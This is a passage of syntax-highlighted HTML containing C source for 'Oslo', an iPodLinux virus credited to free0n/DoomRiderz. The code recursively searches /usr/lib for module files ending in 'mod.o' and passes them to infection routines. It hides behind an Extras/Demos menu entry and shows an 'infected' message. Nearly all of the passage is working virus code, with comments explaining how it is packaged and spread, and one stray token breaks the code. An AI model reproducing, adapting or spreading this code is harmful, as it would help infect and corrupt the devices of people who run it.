   </span><span class="sc11">DirPtr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">opendir</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">DirPtr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc11">oslo_window</span><span class="sc0">
   
   </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readdir</span><span class="sc10">(</span><span class="sc11">DirPtr</span><span class="sc10">))</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc6">".."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">search</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Infected</span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc2">//fubar just cause u know it's gonna be :)!
</span><span class="sc0">         </span><span class="sc11">fubar</span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0"> 
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">statbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">S_ISDIR</span><span class="sc10">(</span><span class="sc11">statbuf</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                  </span><span class="sc11">chdir</span><span class="sc10">(</span><span class="sc11">DirEntryPtr</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">InfectFiles</span><span class="sc10">(</span><span class="sc11">search</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">chdir</span><span class="sc10">(</span><span class="sc6">".."</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">   
      </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">closedir</span><span class="sc10">(</span><span class="sc11">DirPtr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">PzWindow</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">oslo_window</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//start run of the virus
</span><span class="sc0">    </span><span class="sc2">//mod.so will infect every file in /usr/lib
</span><span class="sc0">    </span><span class="sc2">//change to pacman.mod.o to infect pacman :) or
</span><span class="sc0">    </span><span class="sc2">//duckhunt.mod.o to infect duckhunt (but why those are awesome games :)
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">search</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"mod.o"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/usr/lib/"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">dir_stat</span><span class="sc10">;</span><span class="sc0">
   
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dir_stat</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
      
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">S_ISDIR</span><span class="sc10">(</span><span class="sc11">dir_stat</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
   
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">chdir</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
 
    </span><span class="sc2">//this is our default path so in the zip file that this virus is packaged
</span><span class="sc0">    </span><span class="sc2">//in it's setup to have unzipped in /usr/lib the folder and contents for the
</span><span class="sc0">    </span><span class="sc2">//the virus will be good to go. Once ipodlinux boots up and the user runs the 
</span><span class="sc0">    </span><span class="sc2">// it will do a recurisve search in /usr/lib directory where the programs
</span><span class="sc0">    </span><span class="sc2">//are kept.
</span><span class="sc0">    </span><span class="sc11">me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/usr/lib/oslo/oslo.mod.o"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">InfectFiles</span><span class="sc10">(</span><span class="sc11">search</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc3">/**payload message (shows the tux ipodlinux image and my message) **/</span><span class="sc0">
    </span><span class="sc11">PzWindow</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">image</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ttk_load_image</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pz_module_get_datapath</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">module</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"image.png"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">image</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">pz_error</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Could not load %s: %s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pz_module_get_datapath</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">module</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"image.png"</span><span class="sc10">),</span><span class="sc0">
          </span><span class="sc11">strerror</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">errno</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TTK_MENU_DONOTHING</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">ttk_surface_get_dimen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">image</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">imgw</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">imgh</span><span class="sc10">);</span><span class="sc0">     
    </span><span class="sc11">text</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"You are infected with Oslo, the first \n iPodLinux Virus by free0n/DoomRiderz"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pz_new_window</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Oslo Virus"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PZ_WINDOW_NORMAL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">pz_add_widget</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">draw_oslo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">event_oslo</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">pz_finish_window</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">cleanup_oslo</span><span class="sc10">()</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//when the ipodlinux shutsdow this message gets
</span><span class="sc0">    </span><span class="sc2">//displayed to the user :)
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"greetz:genetix,necro,wargame\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_oslo</span><span class="sc10">()</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//register oslo
</span><span class="sc0">    </span><span class="sc11">module</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pz_register_module</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"oslo"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cleanup_oslo</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">//i find it only appropriate that we put this in the Demo section :)
</span><span class="sc0">    </span><span class="sc11">pz_menu_add_action</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"/Extras/Demos/Oslo"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oslo_window</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">PZ_MOD_INIT</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">init_oslo</span><span class="sc10">)</span><span class="sc0">
</span></div></body>
</html>
